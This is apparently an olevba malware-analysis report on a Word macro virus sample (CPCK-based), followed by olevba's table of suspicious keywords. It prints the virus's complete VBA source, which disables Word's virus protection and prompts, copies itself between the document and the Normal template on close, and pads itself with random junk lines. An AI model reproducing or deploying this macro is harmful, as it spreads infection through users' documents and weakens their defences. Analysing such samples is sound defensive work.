olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-f03353b274d9581f0507f966e229b3193774175d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-f03353b274d9581f0507f966e229b3193774175d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()

On Error Resume Next

Options.SaveNormalPrompt = 0

Options.VirusProtection = 0

Options.ConfirmConversions = 0

JF2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Application.EnableCancelKey = 0

HU49 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set AD36 = ActiveDocument.VBProject.VBComponents.Item(1)

GU78 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set AD36 = NormalTemplate.VBProject.VBComponents.Item(1)

UV8 = True

End If

If UV8 <> True And GU78 <> True Then GoTo SK26

If UV8 = True Then AD36.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JF2 - 1))

If GU78 = True Then AD36.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HU49 - 1))

With AD36.CodeModule

For x = 2 To (AD36.CodeModule.CountOfLines - 1) Step 2

For y = 1 To (Int(Rnd * 10) + 2)

UP45 = UP45 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "

Next y

.replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & UP45 & (Chr(65 + Int(Rnd * 22)))

UP45 = ""

Next x

End With

SK26:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

